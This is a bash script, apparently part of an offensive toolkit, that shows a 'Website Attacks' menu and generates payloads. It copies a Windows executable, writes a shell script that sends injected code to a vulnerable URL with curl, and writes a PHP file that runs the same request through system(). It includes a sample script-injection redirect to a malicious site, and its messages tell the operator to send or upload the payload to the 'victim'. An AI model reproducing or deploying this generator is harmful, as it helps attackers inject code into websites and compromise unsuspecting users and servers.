clear
while :
do
echo "";
echo "Website Attacks";
echo "--------------------------------------";
echo "";
echo "  1.- Mirosoft Windows (DIR)";
echo "  2.- GNU/Linux (DIR)";
echo "  3.- HTTP Server (PHP)";
echo "";
echo "  99.- Exit";
echo "--------------------------------------";
echo ""
echo -n "Select an option [WebAttack]> "
read op3511
case $op3511 in
1) echo "[*] Target: Microsoft Windows System";
echo -n "Path to save the payload [WebAttack]> "
read pth1111
echo -n "Name for the payload [WebAttack]> "
read name1111
mkdir $pth1111/$name1111
cp bin/windows_xss.exe $pth1111/$name1111/$name1111.exe
echo "Eg.: http://websi.te/name.php?vuln="
echo -n "Web Attack Target [WebAttack]> "
read target1111
echo -n "Injection Code [WebAttack]> "
read inj1111
echo "$target1111" > $pth1111/$name1111/t.txt
echo "$inj1111" > $pth1111/$name1111/c.txt
echo "[+] GENERATED IN: $pth1111/$name1111 ... NOW COMPRESS THE DIRECTORY AND SEND TO THE VICTIM!"
exit
;;
2) echo "[*] Target: GNU/Linux System";
echo -n "Path to save the payload [WebAttack]> "
read pth343
echo "Eg.: <script>window.location='http://sitiomalicioso.com';</script>"
echo -n "Injection Code [WebAttack]> "
read inject0981
echo -n "Name for the payload [WebAttack]> "
read name343
echo "Eg.: http://websi.te/something.php?parameter"
echo "[¡] DO NOT WRITE '='!!";
echo -n "Web Attack Target [WebAttack]> "
read target133
echo "
#!/bin/bash
curl $target133=$inject0981" > $pth343/$name343.sh
echo "[+] GENERATED IN: $pth343/$name343.sh NOW SEND IT TO VICTIM!"
exit
;;
3) echo "[*] Target: HTTP Server";
echo -n "Path to save the payload [WebAttack]> "
read pth0001
echo "Eg.: <script>window.location='http://sitiomalicioso.com';</script>"
echo -n "Injection Code [WebAttack]> "
read inject0001
echo -n "Name for the payload [WebAttack]> "
read name0001
echo "Eg.: http://websi.te/something.php?parameter"
echo "[¡] DO NOT WRITE '='!!"
echo -n "Web Attack Target [WebAttack]> "
read target0001
echo "
<?php
system('curl $target0001=$inject0001');
?>" > $pth0001/$name0001.php
echo "[+] GENERATED IN: $pth0001/$name0001.php NOW UPLOAD IT TO VICTIM SERVER!"
exit
;;
99) echo "[*] Exiting...";
exit 1;;
*) echo "[!] $op3511 is not a valid option.";
echo "Press enter to continue...";
read foo;;
esac
done
